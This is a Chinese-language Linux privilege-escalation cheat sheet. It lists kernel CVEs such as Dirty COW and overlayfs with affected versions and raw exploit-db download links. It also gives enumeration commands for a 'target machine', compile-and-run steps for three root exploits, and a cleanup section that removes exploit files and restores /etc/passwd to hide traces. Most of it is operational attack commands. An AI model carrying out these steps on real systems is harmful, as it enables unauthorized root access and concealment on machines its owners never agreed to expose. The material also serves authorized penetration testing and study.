# Linux 提权 CVE 速查

## Kernel 3.x 常用提权

| CVE | 名称 | 内核范围 | 影响系统 | 下载 | 难度 |
|-----|------|----------|----------|------|------|
| CVE-2016-5195 | Dirty COW | 2.6.22 - 4.8.3 | 通用 Linux | [40839](https://www.exploit-db.com/raw/40839) | ⭐⭐⭐⭐⭐ |
| CVE-2015-1328 | overlayfs | 3.13.0 - 3.19.0 | Ubuntu 12.04/14.04 | [37292](https://www.exploit-db.com/raw/37292) | ⭐⭐⭐⭐⭐ |
| CVE-2015-8660 | overlayfs2 | 3.0.0 - 4.3.3 | Ubuntu | [39230](https://www.exploit-db.com/raw/39230) | ⭐⭐⭐⭐ |
| CVE-2014-0038 | timeoutpwn | 3.4.0 - 3.13.1 | Ubuntu 13.10 | [31346](https://www.exploit-db.com/raw/31346) | ⭐⭐⭐ |
| CVE-2014-0196 | rawmodePTY | 2.6.31 - 3.14.3 | 通用 Linux | [33516](https://www.exploit-db.com/raw/33516) | ⭐⭐⭐ |
| CVE-2018-14665 | Xorg | 多个 | 通用 Linux | [45697](https://www.exploit-db.com/raw/45697) | ⭐⭐⭐ |

## 速查命令

```bash
# 目标机内核版本
uname -a

# 目标机发行版
cat /etc/os-release 2>/dev/null || cat /etc/*release

# 查找所有 SUID 文件
find / -perm -4000 -type f 2>/dev/null

# 检查 sudo 权限（需要密码时可能失败）
sudo -l

# 检查可写脚本/目录
find / -writable -type f 2>/dev/null | head -50

# 检查 cron
ls -la /etc/cron*

# 检查 MySQL root 空密码
mysql -u root -e 'select User,Host from mysql.user;' 2>/dev/null
```

## 各 exploit 编译方法

### Dirty COW (CVE-2016-5195)
```bash
gcc -pthread dirtycow.c -o dirtycow -lcrypt
./dirtycow newpass
su firefart
# 默认创建用户 firefart，密码为参数
# 会备份 /etc/passwd 到 /tmp/passwd.bak
```

### overlayfs (CVE-2015-1328)
```bash
gcc ofs.c -o ofs
./ofs
# 成功后当前 shell 变为 root (#)
```

### timeoutpwn (CVE-2014-0038)
```bash
gcc timeoutpwn.c -o timeoutpwn
./timeoutpwn
# 需 CONFIG_X86_X32=y
```

## 提权成功后清理

```bash
# 恢复 /etc/passwd（Dirty COW 后）
cp /tmp/passwd.bak /etc/passwd

# 清理临时文件
rm -f /tmp/ofs /tmp/ofs.c /tmp/dirty /tmp/dirty.c /tmp/linpeas.sh
```
